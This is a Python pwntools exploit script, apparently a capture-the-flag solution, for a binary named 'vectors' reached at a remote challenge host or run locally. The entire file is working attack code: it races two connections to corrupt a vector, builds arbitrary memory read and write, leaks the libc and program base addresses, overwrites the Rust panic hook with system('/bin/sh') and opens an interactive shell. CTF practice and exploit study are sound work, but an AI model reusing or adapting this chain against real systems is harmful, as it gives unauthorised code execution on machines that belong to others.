#!/usr/bin/env python2

from pwn import *

def push(p, vec, value):
  p.sendlineafter("pop>", "push")
  p.sendlineafter("vec?", str(vec))
  p.sendlineafter("value?", str(value))

def pop(p, vec):
  p.sendlineafter("pop>", "pop")
  p.sendlineafter("vec?", str(vec))

def read(p, vec, index):
  p.sendlineafter("pop>", "read")
  p.sendlineafter("vec?", str(vec))
  p.sendlineafter("index>", str(index))
  p.recvuntil(" == ")
  return int(p.recvline(keepends=False))

def write(p, vec, index, value):
  p.sendlineafter("pop>", "write")
  p.sendlineafter("vec?", str(vec))
  p.sendlineafter("index>", str(index))
  if "Sorry" not in p.recvn(7):
    p.sendlineafter("? ", str(value))


def read_addr(addr):
  return read(p1, 0, addr/8)

def write_addr(addr, value):
  write(p1, 0, addr/8, value)

def exploit():

  push(p1, 1, 0x1234)
  for i in range(32):
    print str(i)
    push(p1, 0, i)

  p1.recvuntil("0x")
  mapped = int(p1.recvuntil(",", drop=True), 16) - 0x10
  log.info("mapped: 0x{:x}".format(mapped))

  p2.sendlineafter("pop>", "write")
  p2.sendlineafter("vec?", "0")
  p2.sendlineafter("index>", "0")

  push(p1, 0, "1111")

  p2.sendlineafter("? ", str(mapped))

  write(p1, 0, 0, 2**64-1)
  write(p1, 0, 2, 0)

  memalign = read_addr(mapped + ld_offset + 0x18)

  libc.address = memalign - libc.symbols["memalign"]
  log.info("libc: 0x{:x}".format(libc.address))

  environ = read_addr(libc.symbols["environ"])
  log.info("environ: 0x{:x}".format(environ))

  pie_leak = read_addr(environ + start_offset)  
  log.info("pie_leak: 0x{:x}".format(pie_leak))
  binary.address = pie_leak - binary.symbols["_start"]
  log.info("binary.address: 0x{:x}".format(binary.address))

  push(p1, 1, libc.symbols["system"])
  write_addr(binary.symbols["_ZN3std9panicking4HOOK17h40bfd8fd5660cc20E"], next(libc.search("/bin/sh\x00")))
  write_addr(binary.symbols["_ZN3std9panicking4HOOK17h40bfd8fd5660cc20E"]+8, mapped + 0x110)

  pop(p1, 0)
  p1.interactive()


if __name__ == "__main__":
  name = "./vectors"
  binary = ELF(name)

  context.terminal=["tmux", "sp", "-h"]

  context.arch = "amd64"

  if len(sys.argv) > 1:
    p1 = remote("vectors.420blaze.in", 420)
    p2 = remote("vectors.420blaze.in", 420)
    libc = ELF("./libc_02ad2eb11b76c81da7fc43ffe958c14f.so.6")

    ld_offset = 0x4000
    start_offset = 0xf8
  else:

    ld_offset = -0x270000
    start_offset = 0xa0

    libc = ELF("/lib/x86_64-linux-gnu/libc-2.19.so")

    p1 = process([name], env={})
    p2 = process([name], env={})

    gdb.attach(p1, """
    c
    """)

  exploit()
